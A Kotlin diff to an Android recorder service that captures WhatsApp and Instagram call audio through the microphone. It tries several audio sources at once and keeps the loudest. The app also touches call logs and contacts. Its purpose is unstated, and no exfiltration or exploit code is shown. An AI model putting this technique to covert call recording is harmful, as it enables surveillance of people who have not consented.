@@ -19,6 +19,7 @@ import android.os.IBinder
 import android.provider.CallLog
 import android.provider.ContactsContract
 import java.io.BufferedInputStream
+import java.io.ByteArrayOutputStream
 import java.io.DataInputStream
 import java.io.File
 import java.io.FileOutputStream
@@ -30,6 +31,7 @@ import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 import java.util.concurrent.Executors
+import kotlin.math.abs
 
 class RecorderService : Service() {
 
@@ -40,6 +42,7 @@ class RecorderService : Service() {
         @Volatile var recording = false
         @Volatile var startedAt = 0L
         @Volatile var lastError: String? = null
+        @Volatile var info: String? = null
         @Volatile var auto = true
         @Volatile private var instance: RecorderService? = null
 
@@ -176,6 +179,16 @@ class RecorderService : Service() {
         send("S$source")
     }
 
+    private class Probe(val name: String, val ar: AudioRecord) {
+        val buf = ByteArrayOutputStream()
+        @Volatile var peak = 0
+        @Volatile var active = true
+        @Volatile var direct = false
+        var thread: Thread? = null
+    }
+
+    private val lockP = Any()
+
     // WhatsApp / Instagram: app ke andar se mic (Accessibility ON ho tabhi)
     private fun startRecLocal() {
         if (recording) return
@@ -187,36 +200,86 @@ class RecorderService : Service() {
         recording = true
         startedAt = System.currentTimeMillis()
         localRun = true
-        val t = Thread {
-            var ar: AudioRecord? = null
-            try {
-                val rate = 16000
-                val min = AudioRecord.getMinBufferSize(rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
-                ar = AudioRecord(
-                    MediaRecorder.AudioSource.MIC, rate,
-                    AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT,
-                    maxOf(min, rate * 2)
-                )
-                if (ar.state != AudioRecord.STATE_INITIALIZED) throw IllegalStateException("mic start nahi hua")
-                ar.startRecording()
-                val buf = ByteArray(3200)
-                while (localRun) {
-                    val n = ar.read(buf, 0, buf.size)
-                    if (n > 0) {
-                        synchronized(fileLock) { fos?.write(buf, 0, n); pcmBytes += n }
-                    } else if (n < 0) break
-                }
-                ar.stop()
-            } catch (e: Exception) {
-                lastError = "VoIP: ${e.message}"
-            } finally {
-                try { ar?.release() } catch (_: Exception) {}
-                localRun = false
-                finalizeFile()
-            }
-        }
+        info = null
+        val t = Thread { runLocal() }
         localThread = t
         t.start()
+    }
+
+    private fun runLocal() {
+        val probes = mutableListOf<Probe>()
+        try {
+            val rate = 16000
+            val min = AudioRecord.getMinBufferSize(rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
+            val size = maxOf(min, rate * 2)
+            val sources = listOf(
+                MediaRecorder.AudioSource.VOICE_RECOGNITION to "VR",
+                MediaRecorder.AudioSource.UNPROCESSED to "RAW",
+                MediaRecorder.AudioSource.CAMCORDER to "CAM",
+                MediaRecorder.AudioSource.MIC to "MIC"
+            )
+            for ((src, name) in sources) {
+                try {
+                    val ar = AudioRecord(src, rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, size)
+                    if (ar.state == AudioRecord.STATE_INITIALIZED) {
+                        ar.startRecording()
+                        probes += Probe(name, ar)
+                    } else ar.release()
+                } catch (_: Exception) {}
+            }
+            if (probes.isEmpty()) throw IllegalStateException("koi mic source start nahi hua")
+
+            probes.forEach { p ->
+                val th = Thread {
+                    val data = ByteArray(3200)
+                    while (p.active && localRun) {
+                        val n = try { p.ar.read(data, 0, data.size) } catch (_: Exception) { -1 }
+                        if (n < 0) break
+                        if (n == 0) continue
+                        var i = 0
+                        while (i + 1 < n) {
+                            val v = abs(((data[i + 1].toInt() shl 8) or (data[i].toInt() and 0xFF)).toShort().toInt())
+                            if (v > p.peak) p.peak = v
+                            i += 2
+                        }
+                        synchronized(lockP) {
+                            if (p.direct) {
+                                synchronized(fileLock) { fos?.write(data, 0, n); pcmBytes += n }
+                            } else p.buf.write(data, 0, n)
+                        }
+                    }
+                }
+                p.thread = th
+                th.start()
+            }
+
+            val t0 = System.currentTimeMillis()
+            while (localRun && System.currentTimeMillis() - t0 < 5000) Thread.sleep(100)
+
+            val best = probes.maxByOrNull { it.peak }!!
+            info = "WhatsApp mic: " + probes.joinToString(" ") { "${it.name}=${it.peak}" } + "  → ${best.name}"
+            synchronized(lockP) {
+                synchronized(fileLock) {
+                    fos?.write(best.buf.toByteArray())
+                    pcmBytes += best.buf.size()
+                }
+                best.buf.reset()
+                best.direct = true
+            }
+            probes.filter { it !== best }.forEach { it.active = false }
+            while (localRun) Thread.sleep(100)
+        } catch (e: Exception) {
+            lastError = "VoIP: ${e.message}"
+        } finally {
+            localRun = false
+            probes.forEach { it.active = false }
+            probes.forEach { p ->
+                try { p.thread?.join(700) } catch (_: Exception) {}
+                try { p.ar.stop() } catch (_: Exception) {}
+                try { p.ar.release() } catch (_: Exception) {}
+            }
+            finalizeFile()
+        }
     }
 
     private fun stopRec() {
